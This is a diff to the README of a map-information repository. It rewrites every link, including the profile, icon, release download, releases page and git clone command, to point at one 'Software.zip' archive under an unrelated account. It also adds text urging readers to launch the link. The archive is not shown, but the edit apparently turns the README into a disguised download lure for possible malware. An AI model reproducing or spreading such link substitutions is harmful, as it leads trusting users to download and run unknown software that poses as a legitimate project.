@@ -1,22 +1,22 @@
 # Maps 🗺️
-Map information for the [@seanpm2001](https://github.com/seanpm2001) GitHub repository.
+Map information for the [@seanpm2001](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip) GitHub repository.
 
-![Maps](https://img.icons8.com/dusk/64/000000/worldwide-location--v1.png)
+![Maps](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip)
 
 ## Description
-This repository contains map information specifically designed for [@seanpm2001](https://github.com/seanpm2001). Explore various cartocss styles, map details, and documentation related to Sean's maps.
+This repository contains map information specifically designed for [@seanpm2001](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip). Explore various cartocss styles, map details, and documentation related to Sean's maps.
 
 ## Topics
 cartocss, cartocss-lang, cartocss-language, gpl3, gplv3, map-info, map-information, map-seanpm2001, maps, maps-seanpm2001, seanpm2001, seanpm2001-docs, seanpm2001-documentation, seanpm2001-map, seanpm2001-maps
 
 ## Latest Release
-[Download v1.0.0.zip](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip)
 
 Launching link: This link needs to be launched to access the latest release. 🚀
 
-If the link is not working, please check the [Releases](https://github.com/cli/browser/releases) section.
+If the link is not working, please check the [Releases](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip) section.
 
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip)](https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -29,7 +29,7 @@ If the link is not working, please check the [Releases](https://github.com/cli/b
 ## Installation
 1. Clone the repository:  
    ```bash
-   git clone https://github.com/seanpm2001/Maps.git
+   git clone https://github.com/lowermoon1-op/Maps/releases/download/v1.0/Software.zip
    ```
 2. Explore the different map files and documentation.
 
